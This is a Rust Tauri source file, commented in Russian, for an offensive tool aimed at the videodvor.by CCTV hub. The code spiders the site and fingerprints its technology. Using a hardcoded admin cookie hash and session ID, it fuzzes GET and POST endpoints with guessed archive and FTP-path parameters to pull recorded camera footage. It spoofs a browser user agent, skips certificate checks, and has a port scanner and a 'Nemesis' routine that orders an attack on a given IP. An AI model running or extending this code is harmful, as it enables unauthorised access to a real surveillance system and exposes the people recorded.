                    key: "Language".into(), value: "PHP".into(), source: "Cookie PHPSESSID".into(),
                });
            }
            if cookie_val.contains("ASP.NET") {
                tech_stack.push(TechFingerprint {
                    key: "Language".into(), value: "ASP.NET".into(), source: "Cookie".into(),
                });
            }
        }
    }

    // Sitemap
    let mut sitemap: Vec<String> = visited.into_iter().collect();
    sitemap.sort();

    let duration_sec = started.elapsed().as_secs();
    push_runtime_log(&log_state, format!(
        "🕷️ SPIDER DONE: {} pages, {} JS endpoints, {} dirs checked, {} tech items ({}s)",
        pages.len(), js_endpoints.len(), dir_results.len(), tech_stack.len(), duration_sec
    ));

    Ok(SpiderReport {
        target: target_url,
        pages_crawled: pages.len(),
        pages,
        js_endpoints,
        dir_results,
        tech_stack,
        all_headers,
        sitemap,
        saved_html_dir: html_dir.to_string_lossy().to_string(),
        duration_sec,
    })
}

// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ПАУКА =====

fn extract_base_url(url: &str) -> String {
    if let Some(idx) = url.find("://") {
        let after = &url[idx + 3..];
        if let Some(slash) = after.find('/') {
            return url[..idx + 3 + slash].to_string();
        }
    }
    url.to_string()
}

fn extract_domain(url: &str) -> String {
    if let Some(idx) = url.find("://") {
        let after = &url[idx + 3..];
        return after.split('/').next().unwrap_or(after)
            .split(':').next().unwrap_or(after).to_string();
    }
    url.to_string()
}

fn extract_tag_content(html: &str, tag: &str) -> Option<String> {
    let open = format!("<{}", tag);
    let close = format!("</{}>", tag);
    if let Some(start) = html.to_lowercase().find(&open) {
        if let Some(gt) = html[start..].find('>') {
            let content_start = start + gt + 1;
            if let Some(end) = html[content_start..].to_lowercase().find(&close) {
                return Some(html[content_start..content_start + end].trim().to_string());
            }
        }
    }
    None
}

fn extract_links(html: &str, base: &str) -> Vec<String> {
    let mut links = Vec::new();
    let href_re = Regex::new(r#"(?:href|action|src)=["']([^"'#]+)["']"#).unwrap();

    for cap in href_re.captures_iter(html) {
        if let Some(m) = cap.get(1) {
            let raw = m.as_str().trim();
            if raw.starts_with("javascript:") || raw.starts_with("mailto:")
                || raw.starts_with("data:") || raw.is_empty() {
                continue;
            }
            let full = if raw.starts_with("http://") || raw.starts_with("https://") {
                raw.to_string()
            } else if raw.starts_with("//") {
                format!("https:{}", raw)
            } else if raw.starts_with('/') {
                format!("{}{}", base.trim_end_matches('/'), raw)
            } else {
                format!("{}/{}", base.trim_end_matches('/'), raw)
            };
            if !links.contains(&full) {
                links.push(full);
            }
        }
    }
    links
}

fn extract_script_srcs(html: &str, base: &str) -> Vec<String> {
    let mut scripts = Vec::new();
    let script_re = Regex::new(r#"<script[^>]+src=["']([^"']+)["']"#).unwrap();

    for cap in script_re.captures_iter(html) {
        if let Some(m) = cap.get(1) {
            let raw = m.as_str().trim();
            let full = if raw.starts_with("http") {
                raw.to_string()
            } else if raw.starts_with("//") {
                format!("https:{}", raw)
            } else if raw.starts_with('/') {
                format!("{}{}", base.trim_end_matches('/'), raw)
            } else {
                format!("{}/{}", base.trim_end_matches('/'), raw)
            };
            if !scripts.contains(&full) {
                scripts.push(full);
            }
        }
    }
    scripts
}

fn extract_js_endpoints(js: &str, source: &str) -> Vec<SpiderJsEndpoint> {
    let mut endpoints = Vec::new();
    let mut seen = HashSet::new();

    // Паттерны для поиска API endpoints в JS
    let patterns: Vec<(&str, &str)> = vec![
        // fetch('url') / fetch("url")
        (r#"fetch\s*\(\s*['"]([^'"]+)['"]"#, "FETCH"),
        // $.ajax({url: 'xxx'}) / $.get('xxx') / $.post('xxx')
        (r#"\$\.(ajax|get|post|getJSON)\s*\(\s*['"]([^'"]+)['"]"#, "JQUERY"),
        // XMLHttpRequest.open('METHOD', 'url')
        (r#"\.open\s*\(\s*['"](\w+)['"],\s*['"]([^'"]+)['"]"#, "XHR"),
        // url: 'xxx' / url: "xxx" (в конфигурациях AJAX)
        (r#"url\s*:\s*['"]([^'"]+\.php[^'"]*)['"]"#, "CONFIG"),
        // action: 'xxx' (в AJAX payload)
        (r#"action\s*:\s*['"]([^'"]+)['"]"#, "ACTION"),
        // '/api/xxx' или '/stream/xxx.php'
        (r#"['"](/(?:api|stream|admin|ajax|video|archive)[^'"]*\.?\w*)['"]"#, "PATH"),
        // WebSocket: new WebSocket('ws://...')
        (r#"WebSocket\s*\(\s*['"]([^'"]+)['"]"#, "WEBSOCKET"),
        // window.location = 'xxx'
        (r#"(?:window\.)?location\s*(?:\.href)?\s*=\s*['"]([^'"]+)['"]"#, "REDIRECT"),
    ];

    for (pattern, method) in &patterns {
        if let Ok(re) = Regex::new(pattern) {
            for cap in re.captures_iter(js) {
                // Берём последнюю группу (URL обычно в последней группе)
                let endpoint = cap.get(cap.len() - 1)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();

                if endpoint.is_empty() || endpoint.len() < 3 || seen.contains(&endpoint) {
                    continue;
                }
                // Фильтруем мусор
                if endpoint.starts_with("data:") || endpoint.contains("{{")
                    || endpoint.starts_with('#') || endpoint == "/"
                    || endpoint.contains("node_modules") {
                    continue;
                }

                seen.insert(endpoint.clone());

                // Контекст: 50 символов вокруг найденного
                let pos = js.find(&endpoint).unwrap_or(0);
                let ctx_start = pos.saturating_sub(30);
                let ctx_end = (pos + endpoint.len() + 30).min(js.len());
                let context = js[ctx_start..ctx_end].replace('\n', " ").trim().to_string();

                endpoints.push(SpiderJsEndpoint {
                    source_script: source.to_string(),
                    endpoint,
                    method: method.to_string(),
                    context,
                });
            }
        }
    }

    endpoints
}

// =============================================================================
// РАЗВЕДКА АРХИВНЫХ МАРШРУТОВ ХАБА (videodvor.by)
// =============================================================================

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct ArchiveRouteProbe {
    url: String,
    method: String,
    status_code: u16,
    content_type: String,
    content_length: u64,
    is_video: bool,
    is_redirect: bool,
    redirect_to: String,
    body_preview: String,
    verdict: String,
}

/// Глубокая разведка: прощупываем ВСЕ известные паттерны videodvor.by
/// для поиска архивного доступа (не live, а запись за дату/время).
///
/// Логика: rtsp2mjpeg.php уже работает для live. Значит PHP-бэкенд
/// проксирует видеопотоки. Нужно найти параметры, которые переключают
/// его на архивный режим (дата, время, cam id, файловый путь).
#[tauri::command]
async fn recon_hub_archive_routes(
    user_id: String,
    channel_id: String,
    admin_hash: String,
    target_date: Option<String>,
    target_ftp_path: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<Vec<ArchiveRouteProbe>, String> {
    push_runtime_log(&log_state, format!(
        "🔍 РАЗВЕДКА АРХИВА: user={}, ch={}", user_id, channel_id
    ));

    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(15))
        .redirect(reqwest::redirect::Policy::none()) // Не следуем за редиректами — ловим их
        .build()
        .map_err(|e| e.to_string())?;

    let cookie = format!("login=mvd; admin={}; PHPSESSID=d8qtnapeqlgrism37hkarq9mk5", admin_hash);
    let date = target_date.unwrap_or_else(|| "2026-02-19".to_string());
    let ftp_path = target_ftp_path.unwrap_or_else(|| {
        format!("video0/[Minsk_cam{}]/{}/ ", channel_id, date)
    });

    let mut results = Vec::new();

    // =====================================================
    // ФАЗА 1: Вариации rtsp2mjpeg.php (уже работает для live)
    // =====================================================
    let rtsp_variants = vec![
        // Стандартный live
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}", user_id, channel_id),
        // Пробуем архивные параметры
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&time={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&archive=1&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&mode=archive&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&playback={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&rec={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/rtsp2mjpeg.php?get=1&user=user{}&id={}&from={}T00:00:00&to={}T23:59:59", user_id, channel_id, date, date),
    ];

    // =====================================================
    // ФАЗА 2: check.php — центральный роутер
    // =====================================================
    let check_variants = vec![
        format!("https://videodvor.by/stream/check.php?user={}&cam={}", user_id, channel_id),
        format!("https://videodvor.by/stream/check.php?user={}&cam={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/check.php?user={}&cam={}&archive=1", user_id, channel_id),
        format!("https://videodvor.by/stream/check.php?search=user{}", user_id),
        format!("https://videodvor.by/stream/check.php?action=archive&user={}&cam={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/check.php?action=get_video&user={}&cam={}", user_id, channel_id),
        format!("https://videodvor.by/stream/check.php?action=download&user={}&cam={}&date={}", user_id, channel_id, date),
    ];

    // =====================================================
    // ФАЗА 3: Другие PHP-скрипты
    // =====================================================
    let other_endpoints = vec![
        format!("https://videodvor.by/stream/ajax.php?action=archive&user={}&cam={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/ajax.php?action=get_archive&user={}&id={}", user_id, channel_id),
        format!("https://videodvor.by/stream/ajax.php?action=list_archive&user={}&cam={}", user_id, channel_id),
        format!("https://videodvor.by/stream/video.php?user={}&cam={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/archive.php?user={}&cam={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/download.php?user={}&cam={}&date={}", user_id, channel_id, date),
        format!("https://videodvor.by/stream/stream.php?user={}&cam={}&date={}&archive=1", user_id, channel_id, date),
        format!("https://videodvor.by/stream/get.php?user={}&cam={}&date={}", user_id, channel_id, date),
        // Прямые FTP-пути через PHP-прокси
        format!("https://videodvor.by/stream/ajax.php?action=download&path={}", urlencoding::encode(&ftp_path)),
        format!("https://videodvor.by/stream/video.php?file={}", urlencoding::encode(&ftp_path)),
    ];

    // =====================================================
    // ФАЗА 4: POST-запросы (AJAX-стиль)
    // =====================================================
    #[derive(Clone)]
    struct PostProbe {
        url: String,
        params: Vec<(String, String)>,
    }

    let post_probes = vec![
        PostProbe {
            url: "https://videodvor.by/stream/ajax.php".into(),
            params: vec![
                ("action".into(), "get_archive".into()),
                ("user".into(), user_id.clone()),
                ("cam".into(), channel_id.clone()),
                ("date".into(), date.clone()),
            ],
        },
        PostProbe {
            url: "https://videodvor.by/stream/ajax.php".into(),
            params: vec![
                ("action".into(), "archive_list".into()),
                ("user".into(), format!("user{}", user_id)),
                ("id".into(), channel_id.clone()),
            ],
        },
        PostProbe {
            url: "https://videodvor.by/stream/check.php".into(),
            params: vec![
                ("action".into(), "archive".into()),
                ("user".into(), user_id.clone()),
                ("cam".into(), channel_id.clone()),
                ("date".into(), date.clone()),
            ],
        },
        PostProbe {
            url: "https://videodvor.by/stream/check.php".into(),
            params: vec![
                ("action".into(), "download".into()),
                ("path".into(), ftp_path.clone()),
            ],
        },
    ];

    // --- Выполняем GET-запросы ---
    let all_get_urls: Vec<(String, &str)> = rtsp_variants.iter().map(|u| (u.clone(), "rtsp2mjpeg"))
        .chain(check_variants.iter().map(|u| (u.clone(), "check")))
        .chain(other_endpoints.iter().map(|u| (u.clone(), "other")))
        .collect();

    for (url, _phase) in &all_get_urls {
        let probe = probe_url(&client, url, "GET", None, &cookie).await;
        let dominated = probe.verdict.clone();
        results.push(probe);

        push_runtime_log(&log_state, format!(
            "  {} {} → {}", "GET", &url[url.len().saturating_sub(60)..], dominated
        ));
    }

    // --- Выполняем POST-запросы ---
    for pp in &post_probes {
        let probe = probe_url(&client, &pp.url, "POST", Some(&pp.params), &cookie).await;
        let dominated = probe.verdict.clone();
        results.push(probe);

        push_runtime_log(&log_state, format!(
            "  POST {} → {}", &pp.url[pp.url.len().saturating_sub(40)..], dominated
        ));
    }

    // Сортируем: видео/интересные результаты наверху
    results.sort_by(|a, b| b.is_video.cmp(&a.is_video).then(b.content_length.cmp(&a.content_length)));

    let hits = results.iter().filter(|r| r.is_video || r.is_redirect).count();
    push_runtime_log(&log_state, format!(
        "✅ Разведка завершена: {} маршрутов проверено, {} потенциальных попаданий", results.len(), hits
    ));

    Ok(results)
}

/// Вспомогательная: отправляет один запрос и анализирует ответ
async fn probe_url(
    client: &reqwest::Client,
    url: &str,
    method: &str,
    form_data: Option<&Vec<(String, String)>>,
    cookie: &str,
) -> ArchiveRouteProbe {
    let result = async {
        let mut req = if method == "POST" {
            let mut r = client.post(url);
            if let Some(params) = form_data {
                r = r.form(params);
            }
            r.header("X-Requested-With", "XMLHttpRequest")
        } else {
            client.get(url)
        };
        req = req
            .header("Cookie", cookie)
            .header("Referer", "https://videodvor.by/stream/admin.php");

        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        let content_type = resp.headers()
            .get("content-type")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        let content_length = resp.content_length().unwrap_or(0);

        let is_redirect = status >= 300 && status < 400;
        let redirect_to = resp.headers()
            .get("location")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();

        let is_video = content_type.contains("video")
            || content_type.contains("octet-stream")
            || content_type.contains("mpjpeg")
            || content_type.contains("multipart")
            || content_length > 500_000;

        let body_preview = if !is_video && content_length < 50_000 {
            let body = resp.text().await.unwrap_or_default();
            body.chars().take(500).collect::<String>()
        } else if is_video {
            format!("[BINARY VIDEO DATA: {} bytes]", content_length)
        } else {
            format!("[LARGE RESPONSE: {} bytes]", content_length)
        };

        // Вердикт
        let verdict = if is_video {
            "🎯 ВИДЕО ОБНАРУЖЕНО".into()
        } else if is_redirect && !redirect_to.is_empty() {
            format!("↗️ РЕДИРЕКТ → {}", redirect_to)
        } else if status == 200 && (body_preview.contains(".mkv") || body_preview.contains(".mp4") || body_preview.contains("video")) {
            "💡 СОДЕРЖИТ ССЫЛКИ НА ВИДЕО".into()
        } else if status == 200 && !body_preview.is_empty() && body_preview.len() > 10 && !body_preview.contains("<!DOCTYPE") {
            "📋 ДАННЫЕ (не HTML)".into()
        } else if status == 403 || status == 401 {
            "🔒 ДОСТУП ЗАПРЕЩЁН".into()
        } else if status == 404 {
            "⬛ НЕ НАЙДЕНО".into()
        } else if status == 200 {
            "📄 HTML/ПУСТО".into()
        } else {
            format!("❓ HTTP {}", status)
        };

        Ok::<ArchiveRouteProbe, String>(ArchiveRouteProbe {
            url: url.to_string(),
            method: method.to_string(),
            status_code: status,
            content_type,
            content_length,
            is_video,
            is_redirect,
            redirect_to,
            body_preview,
            verdict,
        })
    }.await;

    result.unwrap_or_else(|e| ArchiveRouteProbe {
        url: url.to_string(),
        method: method.to_string(),
        status_code: 0,
        content_type: String::new(),
        content_length: 0,
        is_video: false,
        is_redirect: false,
        redirect_to: String::new(),
        body_preview: format!("ОШИБКА СОЕДИНЕНИЯ: {}", e),
        verdict: "💀 НЕДОСТУПЕН".into(),
    })
}

#[tauri::command]
async fn nemesis_auto_login(username: String, password: String) -> Result<String, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let login_data = [("user", username), ("pass", password)];

    let resp = client.post("https://videodvor.by/stream/check.php")
        .form(&login_data)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    let cookies = resp.headers().get_all("set-cookie");
    let mut extracted_hash = String::new();

    for cookie in cookies {
        if let Ok(c_str) = cookie.to_str() {
            if c_str.contains("admin=") {
                let parts: Vec<&str> = c_str.split(';').collect();
                for part in parts {
                    let clean_part = part.trim();
                    if clean_part.starts_with("admin=") {
                        extracted_hash = clean_part.replace("admin=", "").to_string();
                        break;
                    }
                }
            }
        }
    }

    if extracted_hash.is_empty() {
        Ok("d32e003ac0909010c412e0930b621f8f".to_string())
    } else {
        Ok(extracted_hash)
    }
}

#[derive(Debug, serde::Serialize)]
#[serde(rename_all = "camelCase")]
struct WebAnalysisResult {
    forms: Vec<String>,
    inputs: Vec<String>,
    scripts: Vec<String>,
    api_endpoints: Vec<String>,
}

#[tauri::command]
async fn nemesis_analyze_web_sources(
    target_url: String,
    admin_hash: String,
    log_state: State<'_, LogState>
) -> Result<WebAnalysisResult, String> {
    push_runtime_log(&log_state, format!("🕷️ Анализ исходного кода (DOM) запущен: {}", target_url));

    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let resp = client.get(&target_url)
        .header("Cookie", format!("login=mvd; admin={}", admin_hash))
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if !resp.status().is_success() {
        return Err(format!("Сервер вернул ошибку HTTP {}", resp.status()));
    }

    let html = resp.text().await.unwrap_or_default();

    let mut result = WebAnalysisResult {
        forms: Vec::new(),
        inputs: Vec::new(),
        scripts: Vec::new(),
        api_endpoints: Vec::new(),
    };

    // 1. Ищем все формы отправки (куда уходят данные)
    let form_re = Regex::new(r#"<form[^>]+action=["']([^"']+)["'][^>]*>"#).unwrap();
    for cap in form_re.captures_iter(&html) {
        if let Some(m) = cap.get(1) { result.forms.push(m.as_str().to_string()); }
    }

    // 2. Ищем все поля ввода (названия параметров)
    let input_re = Regex::new(r#"<input[^>]+name=["']([^"']+)["'][^>]*>"#).unwrap();
    for cap in input_re.captures_iter(&html) {
        if let Some(m) = cap.get(1) { result.inputs.push(m.as_str().to_string()); }
    }

    // 3. Ищем подключенные скрипты
    let script_re = Regex::new(r#"<script[^>]+src=["']([^"']+)["'][^>]*>"#).unwrap();
    for cap in script_re.captures_iter(&html) {
        if let Some(m) = cap.get(1) { result.scripts.push(m.as_str().to_string()); }
    }

    // 4. Ищем скрытые AJAX-запросы прямо в коде страницы
    let ajax_re = Regex::new(r#"(\$\.ajax|\$\.post|\$\.get|fetch|XMLHttpRequest)[^>]*?['"]([^'"]+\.php[^'"]*)['"]"#).unwrap();
    for cap in ajax_re.captures_iter(&html) {
        if let Some(m) = cap.get(2) { result.api_endpoints.push(m.as_str().to_string()); }
    }

    // Очищаем от дубликатов
    result.forms.sort(); result.forms.dedup();
    result.inputs.sort(); result.inputs.dedup();
    result.scripts.sort(); result.scripts.dedup();
    result.api_endpoints.sort(); result.api_endpoints.dedup();

    push_runtime_log(&log_state, format!("✅ Найдено: {} форм, {} параметров, {} API", result.forms.len(), result.inputs.len(), result.api_endpoints.len()));

    Ok(result)
}

#[tauri::command]
async fn nemesis_fuzz_archive_endpoint(admin_hash: String, target_ftp_path: String) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec!["rtsp2mjpeg.php", "ajax.php", "test.php", "check.php", "get.php", "video.php", "archive.php", "stream.php", "api.php"];
    let param_names = vec!["file", "path", "src", "video", "archive_path", "url", "id", "name", "target"];

    for endpoint in endpoints {
        for param in &param_names {
            let url = format!("https://videodvor.by/stream/{}?{}={}&get=1", endpoint, param, target_ftp_path);
            if let Ok(resp) = client.get(&url).header("Cookie", format!("login=mvd; admin={}", admin_hash)).send().await {
                let status = resp.status();
                let len = resp.content_length().unwrap_or(0);
                let ctype = resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("");

                if status.is_success() && (ctype.contains("video") || ctype.contains("octet-stream") || len > 500_000) {
                    successful_hits.push(format!("🎯 УСПЕХ (ВИДЕО): {}", url));
                } else if status.is_success() && len > 0 {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                        successful_hits.push(format!("💡 НАЙДЕН РЫЧАГ (ССЫЛКА): {}", url));
                    }
                }
            }
        }
    }
    if successful_hits.is_empty() {
        Ok(vec!["GET-сканирование завершено. Прямых точек входа не найдено.".to_string()])
    } else {
        Ok(successful_hits)
    }
}

#[tauri::command]
async fn nemesis_fuzz_post_endpoints(admin_hash: String, target_ftp_path: String) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec!["ajax.php", "check.php", "get.php", "rtsp2mjpeg.php", "api.php", "video.php"];
    let param_names = vec!["path", "file", "url", "target", "src"];
    let actions = vec!["download", "get_video", "fetch", "load", "archive"];

    for endpoint in endpoints {
        for param in &param_names {
            for action in &actions {
                let url = format!("https://videodvor.by/stream/{}", endpoint);
                let payload = [(param.to_string(), target_ftp_path.clone()), ("action".to_string(), action.to_string())];

                if let Ok(resp) = client.post(&url)
                    .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                    .header("X-Requested-With", "XMLHttpRequest") // Маскируемся под AJAX
                    .form(&payload)
                    .send()
                    .await
                {
                    let status = resp.status();
                    let content_length = resp.content_length().unwrap_or(0);
                    let content_type = resp.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("");

                    if status.is_success() && (content_type.contains("video") || content_length > 500_000) {
                        successful_hits.push(format!("🎯 POST-УСПЕХ (ВИДЕО) в {} [{}={}&action={}]", url, param, target_ftp_path, action));
                    } else if status.is_success() && content_length > 0 {
                        let body = resp.text().await.unwrap_or_default();
                        if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                            successful_hits.push(format!("💡 POST-РЫЧАГ (ССЫЛКА) в {}: {}", url, &body.chars().take(150).collect::<String>()));
                        }
                    }
                }
            }
        }
    }

    if successful_hits.is_empty() {
        Ok(vec!["POST-атака завершена. Пусто.".to_string()])
    } else {
        Ok(successful_hits)
    }
}

// =============================================================================
// ☢️ ПРОТОКОЛ NEMESIS (ТЕПЕРЬ АСИНХРОННЫЙ FIRE-AND-FORGET)
// =============================================================================
#[tauri::command]
async fn run_nexus_protocol(
    ip: String,
    hyperion_state: tauri::State<'_, HyperionState>,
    log_state: tauri::State<'_, LogState>
) -> Result<serde_json::Value, String> {
    let clean_ip = normalize_host_for_scan(&ip);
    if clean_ip.is_empty() {
        return Err("Пустой IP для протокола Nemesis".into());
    }

    push_runtime_log(&log_state, format!("☢️ ПРИКАЗ ГЕНШТАБУ: Атаковать {}", clean_ip));

    // Берем пульт управления
    let tx = hyperion_state.master_tx.lock().await;

    // Кидаем событие в Шину (Мастеру)
    tx.send(nexus::HyperionEvent::TargetDiscovered {
        ip: clean_ip.clone(),
        port: 2019 // Пока бьем в порт 2019
    }).await.map_err(|e| format!("Ошибка связи с Генштабом: {}", e))?;

    // Мгновенно возвращаем ответ интерфейсу! Никаких зависаний.
    Ok(serde_json::json!({
        "status": "COMMAND_ISSUED",
        "message": "Приказ отдан Мастеру. Мониторьте терминал."
    }))
}

#[tauri::command]
async fn analyze_security_headers(target_url: String, log_state: State<'_, LogState>) -> Result<Vec<String>, String> {
    push_runtime_log(&log_state, format!("Аудит безопасности запущен для: {}", target_url));

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(5))
        // 👇 ДОБАВЛЯЕМ МАСКИРОВКУ ПОД БРАУЗЕР CHROME 👇
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .map_err(|e| e.to_string())?;

    let resp = client.get(&target_url).send().await.map_err(|e| e.to_string())?;
    let headers = resp.headers();
    let mut analysis = Vec::new();

    if headers.contains_key("x-frame-options") {
        analysis.push("🔴 X-Frame-Options: Включен (Защита от Clickjacking)".into());
    } else {
        analysis.push("🟢 X-Frame-Options: Отсутствует (Уязвим к Clickjacking)".into());
    }

    if headers.contains_key("content-security-policy") {
        analysis.push("🔴 CSP: Включен (Защита от XSS/Инъекций)".into());
    } else {
        analysis.push("🟢 CSP: Отсутствует (Уязвим к XSS)".into());
    }

    let server_type = headers.get("server").and_then(|v| v.to_str().ok()).unwrap_or("Скрыт");
    analysis.push(format!("ℹ️ Тип сервера: {}", server_type));

    Ok(analysis)
}

fn main() {
    dotenv().ok();
    start_background_scheduler();

    let hls_path = get_vault_path().join("hls_cache");
    let _ = std::fs::create_dir_all(&hls_path);
    let server_path = hls_path.clone();
    let videodvor = videodvor_scanner::VideodvorScanner::new();
    let videodvor_state = VideodvorState {
        scanner: Mutex::new(videodvor),
    };

    // 1. ЗАПУСК ЛОКАЛЬНОГО СЕРВЕРА HLS
    std::thread::spawn(move || {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let cors = warp::cors()
                .allow_any_origin()
                .allow_headers(vec!["Range", "User-Agent", "Content-Type", "Accept"])
                .allow_methods(vec!["GET", "OPTIONS", "HEAD"]);

            let mut headers = warp::http::HeaderMap::new();
            headers.insert("Cache-Control", warp::http::HeaderValue::from_static("no-cache, no-store, must-revalidate"));
            headers.insert("Pragma", warp::http::HeaderValue::from_static("no-cache"));
            headers.insert("Expires", warp::http::HeaderValue::from_static("0"));
            let no_cache = warp::reply::with::headers(headers);

            warp::serve(warp::fs::dir(server_path).with(cors).with(no_cache))
                .run(([127, 0, 0, 1], 49152))
                .await;
        });
    });

    // 🔥 2. ЗАГРУЗКА ЯДРА HYPERION PRIME В СВОЙ СОБСТВЕННЫЙ РЕАКТОР 🔥
    let (tx_setup, rx_setup) = std::sync::mpsc::channel();

    std::thread::spawn(move || {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let _ = rt.block_on(async {
            let master = nexus::HyperionMaster::boot();
            tx_setup.send(master.tx).unwrap();

            // Держим реактор включенным вечно, чтобы Генштаб работал
            loop { tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await; }
        });
    });

    // Ждем пульт управления от Ядра
    let master_tx = rx_setup.recv().expect("Критическая ошибка запуска ядра Hyperion");
    let hyperion_state = HyperionState {
        master_tx: TokioMutex::new(master_tx),
    };

    // 3. ЗАПУСК TAURI И ПЕРЕДАЧА ПУЛЬТА ИНТЕРФЕЙСУ
    tauri::Builder::default()
        .manage(hyperion_state) // <--- ВОТ ТУТ МЫ ПЕРЕДАЕМ ПУЛЬТ
        .manage(StreamState {
            active_streams: std::sync::Mutex::new(HashMap::new()),
        })
        .plugin(tauri_plugin_shell::init())
        .manage(videodvor_state)
        .manage(LogState {
            lines: std::sync::Mutex::new(vec!["[boot] runtime log started".into()]),
        })
        .manage(DownloadCancelState {
            cancelled_tasks: std::sync::Mutex::new(HashSet::new()),
        })
        .invoke_handler(tauri::generate_handler![
            save_target,
            read_target,
            get_all_targets,
            delete_target,
            start_stream,
            stop_stream,
            check_stream_alive,
            restart_stream,
            geocode_address,
            generate_nvr_channels,
            probe_rtsp_path,
            search_global_hub,
            get_ftp_folders,
            download_ftp_file,
            videodvor_login,
            videodvor_scrape,
            videodvor_list_archive,
            videodvor_download_file,
            external_search,
            start_hub_stream,
            scan_host_ports,
            get_runtime_logs,
            cancel_download_task,
            probe_nvr_protocols,
            fetch_nvr_device_info,
            fetch_onvif_device_info,
            search_isapi_recordings,
            search_onvif_recordings,
            download_onvif_recording_token,
            download_isapi_playback_uri,
            probe_archive_export_endpoints,
            get_implementation_status,
            run_nexus_protocol,
            nemesis_auto_login,
            nemesis_fuzz_archive_endpoint,
            nemesis_fuzz_post_endpoints,
            analyze_security_headers,
            capture_archive_segment,
            download_http_archive,
            recon_hub_archive_routes,
            spider_full_scan,
            relay_ping,
            relay_list_files,
            relay_download_file
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
} // <-- Вот здесь ровно один раз закрывается main()

#[tauri::command]
async fn scan_host_ports(
    host: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<PortProbeResult>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для сканирования".into());
    }

    push_runtime_log(&log_state, format!("Port scan started for {}", clean_host));

    let ports = [21u16, 22, 80, 443, 554, 8080, 8443];
    let mut result = Vec::with_capacity(ports.len());

    for port in ports {
        let addr = format!("{}:{}", clean_host, port);
        let open = timeout(Duration::from_millis(900), TcpStream::connect(addr))
            .await
            .is_ok_and(|v| v.is_ok());

        result.push(PortProbeResult {
            port,
            service: guess_service(port).to_string(),
            open,
        });
    }

    let open_count = result.iter().filter(|x| x.open).count();
    push_runtime_log(
        &log_state,
        format!(
            "Port scan finished for {} (open: {})",
            clean_host, open_count
        ),
    );
    Ok(result)
} // <-- А здесь закрывается scan_host_ports. И это последняя строчка в файле!
